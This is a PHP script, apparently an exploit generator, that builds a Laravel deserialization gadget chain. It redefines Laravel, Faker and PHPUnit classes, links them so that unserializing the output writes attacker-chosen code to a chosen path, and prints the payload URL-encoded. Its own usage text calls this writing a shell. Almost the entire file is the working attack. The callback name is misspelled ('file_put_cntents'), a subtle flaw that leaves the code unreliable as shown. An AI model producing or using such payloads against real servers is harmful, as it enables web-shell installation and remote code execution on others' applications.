<?php
/*
Author:monitor
description:
    laravel deserialization chain
*/
namespace Illuminate\Broadcasting
{
    class PendingBroadcast{
        protected $events;
        protected $event;
        public function __construct($events,$event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Faker
{
    class ValidGenerator{
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($generator,$validator,$maxRetries=10000)
        {
            $this->generator = $generator;
            $this->validator = $validator;
            $this->maxRetries = $maxRetries;
        }
    }
    class DefaultGenerator{
        protected $default;
        public function __construct($default)
        {
            $this->default = $default;
        }
    }
}
namespace PHPUnit\Framework\MockObject\Invocation
{
    class StaticInvocation{
        private $parameters;
        public function __construct($parameters)
        {
            $this->parameters=$parameters;
        }
    }
}

namespace PHPUnit\Framework\MockObject\Stub
{
    class ReturnCallback{
        private $callback;
        public function __construct($callback)
        {
            $this->callback=$callback;   
        }
    }
}

namespace
{
    if($argc<3){
        echo "Description:\n\tUse laravel deserialization to write shell.";
        echo "\nUsage:" .$argv[0] . " <path> <code>";
        exit();
    }
    $path = $argv[1];
    $code = $argv[2];
    $staticInvocation = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation(array($path,$code));
    $defaultgererator = new Faker\DefaultGenerator($staticInvocation);
    $returncallback = new PHPUnit\Framework\MockObject\Stub\ReturnCallback("file_put_cntents");
    $validgenerator = new Faker\ValidGenerator($defaultgererator,$returncallback);
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($validgenerator,"pass");
    echo urlencode(serialize($pendingbroadcast));
}